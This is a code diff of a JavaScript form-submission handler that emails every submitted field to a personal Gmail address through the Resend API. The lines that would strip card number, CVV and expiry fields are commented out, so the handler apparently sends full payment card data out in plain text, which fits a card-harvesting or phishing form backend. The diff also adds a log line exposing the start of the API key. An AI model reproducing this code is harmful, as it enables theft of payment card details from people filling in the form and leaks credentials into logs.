@@ -2,10 +2,10 @@ import { Resend } from 'resend';
 const resend = new Resend(process.env.RESEND_API_KEY);
 
 export default async function handler(req, res) {
+    console.log('API Key loaded?', process.env.RESEND_API_KEY ? 'Yes, starts with ' + process.env.RESEND_API_KEY.slice(0, 5) : 'NO - undefined')
     if (req.method !== 'POST') return res.status(405).end();
 
     const data = req.body;
-
     // delete data.f_cardnum;
     // delete data.f_cvv;
     // delete data.f_expiry;
@@ -15,15 +15,22 @@ export default async function handler(req, res) {
         .join('');
 
     try {
-        await resend.emails.send({
+        const { data: sendData, error } = await resend.emails.send({
             from: 'Practice Form <onboarding@resend.dev>',
-            to: 'meebeebari75@gmail.com', // replace with your real email
+            to: 'meebeebari88@gmail.com', // <-- confirm this is your real email
             subject: 'New test form submission',
             html: rows || '<p>No data submitted</p>',
         });
-        res.status(200).json({ success: true });
+
+        if (error) {
+            console.error('Resend rejected the email:', error);
+            return res.status(400).json({ error });
+        }
+
+        console.log('Email sent:', sendData);
+        res.status(200).json({ success: true, sendData });
     } catch (err) {
-        console.error(err);
+        console.error('Unexpected error:', err);
         res.status(500).json({ error: 'Failed to send' });
     }
 }
